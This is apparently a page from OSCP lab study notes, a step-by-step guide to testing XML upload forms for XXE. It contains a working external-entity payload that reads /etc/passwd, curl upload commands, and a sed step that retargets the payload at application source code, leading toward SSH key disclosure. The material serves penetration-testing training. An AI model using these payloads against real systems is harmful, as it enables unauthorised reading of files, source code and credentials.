# Linux - XXE

**Step 9B of 50 · Linux/Web**

*Test XML endpoints and multipart XML uploads for safe external-entity file reads, then use disclosed source to choose the next branch.*

## When to open this stage

Open this page when a web form accepts XML, a request body is parsed as XML, or an upload form names XML fields. Read the form and save the response before sending a payload. A reflected `/etc/passwd` result is enough to prove the parser behavior; do not begin with a private key or a flag path.

## Run this

Set the upload route and field from the form first:

~~~bash
boxset UploadURL "http://$BoxIP:$WebPort/upload"
boxset FileField "file"
curl -sS "$UploadURL" | tee "$BoxDir/loot/upload.txt"
~~~

Create a harmless local file-read payload and upload it as a multipart file:

~~~bash
cat > "$BoxDir/exploits/xxe-passwd.xml" <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE feed [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<feed>
  <Author>&xxe;</Author>
  <Subject>XXE validation</Subject>
  <Content>safe file-read proof</Content>
</feed>
EOF

curl -sS \
  -F "$FileField=@$BoxDir/exploits/xxe-passwd.xml;filename=feed.xml" \
  "$UploadURL" | tee "$BoxDir/loot/xxe-passwd.txt"
~~~

## Example output

~~~text
Author: ...
git:x:...
roosa:x:...
blogfeed:x:...
Subject: XXE validation
~~~

Focus on three things:

- The response contains file content, not only a success message.
- The content appears inside a field controlled by the XML document.
- The upload used the exact multipart field and element names from the form.

## What did you get?

- [ ] `/etc/passwd` is reflected → **Set `$Username` from the discovered account list, then read the application source with a second controlled entity and go to Step 9C · [[Linux - Python Pickle]] when unsafe deserialization appears**
- [ ] The route accepts XML but returns no file content → **Save the raw response, check whether the parser blocks external entities, and test source disclosure only if the application reveals a predictable path**
- [ ] The server rejects the request → **Confirm the multipart field, filename, root element, and `Content-Type`; return to [[Linux - Web Enum]] if the form shape is still unclear**
- [ ] A private key or configuration file is disclosed → **Save the complete response to private loot, extract mechanically, validate with `ssh-keygen -y`, and go to [[Linux - Credential Search]]**
- [ ] The entity is not expanded → **Do not escalate to blind exfiltration immediately; inspect the parser and source clues, then go to [[Linux - Exploit Search]] if no application route remains**

## Source-first follow-up

Once file reads work, read the handler source with the same payload pattern:

~~~bash
boxset SourcePath "/home/$Username/deploy/src/feed.py"
sed "s#file:///etc/passwd#file://$SourcePath#" \
  "$BoxDir/exploits/xxe-passwd.xml" > "$BoxDir/exploits/xxe-source.xml"
curl -sS \
  -F "$FileField=@$BoxDir/exploits/xxe-source.xml;filename=feed.xml" \
  "$UploadURL" | tee "$BoxDir/loot/source.txt"
grep -nE 'pickle|loads|base64|newpost|eval' "$BoxDir/loot/source.txt"
~~~

Source review is the decision point. It can reveal the exact endpoint, request encoding, file paths, authentication assumptions, or an unsafe deserialization sink. Continue to [[Linux - Python Pickle]] only when the source confirms the relevant loader.

## Notes and gotchas

- Use `/etc/passwd` as the initial proof because it is predictable and non-secret.
- A multipart upload needs `curl -F`; posting raw XML to the route may test the wrong code path.
- Keep raw responses in `$BoxDir/loot/` and redact screenshots that contain keys, tokens, or configuration secrets.
- Do not use `file:///root/` or flag paths as the first test.
- If a long multi-line secret is reflected, save it mechanically rather than copying terminal wrapping.

## Seen in

- [[OSCP/BOXES/WRITE UPS/Linux/DevOops|DevOops]] -- multipart XML upload reflected `/etc/passwd`, Flask source, and an SSH key
- [[OSCP/BOXES/WRITE UPS/Windows/MarkUp|MarkUp]] -- reflected XML file read disclosed a Windows SSH key path

## Related stages

- [[Linux - Web Enum]]
- [[Linux - Python Pickle]]
- [[Linux - Credential Search]]
- [[Linux - Clean Down]]

## External Resources

- https://portswigger.net/web-security/xxe
- https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

## Why this matters for OSCP

This stage turns an XML clue into a controlled proof, then uses source disclosure to choose the next test instead of guessing payloads.
